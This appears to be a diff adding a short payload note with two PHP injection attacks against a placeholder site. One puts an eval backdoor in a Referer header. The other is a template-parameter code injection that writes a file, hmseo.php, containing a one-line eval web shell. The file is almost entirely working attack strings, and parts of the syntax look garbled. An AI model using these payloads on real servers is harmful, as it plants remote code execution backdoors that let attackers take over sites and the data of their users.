@@ -1,0 +1,10 @@
+PHP Header Injection
+
+hxxp://www.example.com/
+Referer=@eval($_POST[hm]);?>hmseo')</php> 
+
+----------------------------------------------
+PHP Code Injection
+
+hxxp://www.example.com//?a=fetch&templateFile=public/index&prefix=''&content=<php>
+file_put_contents('hmseo.php'. '<?php @eval($_POST[hm]);?>hmseo')</php>
